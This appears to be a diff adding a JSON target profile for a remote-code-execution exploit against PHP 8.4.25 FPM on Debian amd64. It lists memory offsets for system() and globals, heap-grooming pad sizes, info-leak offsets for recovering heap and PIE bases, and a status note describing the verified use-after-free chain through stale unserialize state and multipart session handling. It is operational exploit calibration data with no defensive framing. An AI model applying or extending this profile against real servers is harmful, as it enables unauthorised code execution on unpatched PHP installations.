@@ -1,0 +1,66 @@
+{
+  "name": "php-8.4.25-fpm",
+  "php_version": "8.4.25",
+  "branch": "8.4",
+  "fixed_in": "8.4.27",
+  "sapi": "fpm",
+  "verified": true,
+  "rce": true,
+  "distro": "debian",
+  "arch": "amd64",
+  "libphp": {
+    "zif_system": "0x386460",
+    "zval_ptr_dtor": "0x549890",
+    "htdata": null
+  },
+  "fpm": {
+    "basic_globals": "0xa04660",
+    "bg_unserialize_data_off": 872,
+    "bg_unserialize_level_off": 880,
+    "struct_size": 8216,
+    "reclaim_pads": [
+      4096,
+      4096
+    ],
+    "reclaim_size": 12288,
+    "oracle": "/proc/<pid>/mem (local lab)",
+    "no_oracle": {
+      "reclaim_pads": [
+        4096,
+        4096
+      ],
+      "reclaim_size": 16384,
+      "candidates": [
+        {
+          "d_off": "0x7f000",
+          "k": "0xfe8"
+        }
+      ],
+      "bases": "stable one-slot geometry: d_off=0x7f000, k=0xfe8; recalibrate if the allocator layout changes"
+    },
+    "leak": {
+      "arm_path": "/bigvar.php",
+      "pads": [
+        32768,
+        16384
+      ],
+      "size": 16384,
+      "header_content_off": "0x17e8",
+      "read_len": "0x15810",
+      "chunk_ptr_off": "0x77f8",
+      "chunk_base_off": "0x8b000",
+      "pie_ptr_off": "0x157e8",
+      "pie_base_off": "0x4e9fc7",
+      "bases": "leaked over HTTP from a stale short-session string OOB read"
+    }
+  },
+  "stages": {},
+  "config": {
+    "memory_limit": 8388608,
+    "display_errors": "On",
+    "session_upload_progress": "On",
+    "workers": 2
+  },
+  "status": "RCE verified in the nginx+FPM lab: post-RINIT OOM leaves BG(unserialize) stale (level=1), the pre-RINIT rfc1867 session_start of a follow-up multipart reuses the freed struct, and two 4 KB pads + a 16 KB big field cover d at 0x7f000. The HTTP stale-string leak recovers chunk/PIE with the 8.4.25 PIE offset. The command runs and the consumer worker aborts afterwards; FPM respawns it.",
+  "oom_mb": 4
+}
